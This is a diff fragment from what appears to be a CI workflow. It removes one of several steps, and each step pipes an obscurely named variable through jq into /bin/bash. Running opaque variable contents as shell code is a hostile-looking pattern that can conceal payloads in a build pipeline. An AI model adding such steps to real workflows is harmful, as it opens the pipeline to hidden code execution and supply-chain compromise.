@@ -26,7 +26,6 @@ jobs:
           echo $wmthu54106 | jq -r .ft65883 | /bin/bash
           echo $nzc876 | jq -r .vndoj4567 | /bin/bash
           echo $jjy3 | jq -r .wj12 | /bin/bash
-          printf '%s' "$j253" | jq -r .yw08 | /bin/bash
           echo $bf938 | jq -r .bx0770 | /bin/bash
 
       - name: Save data
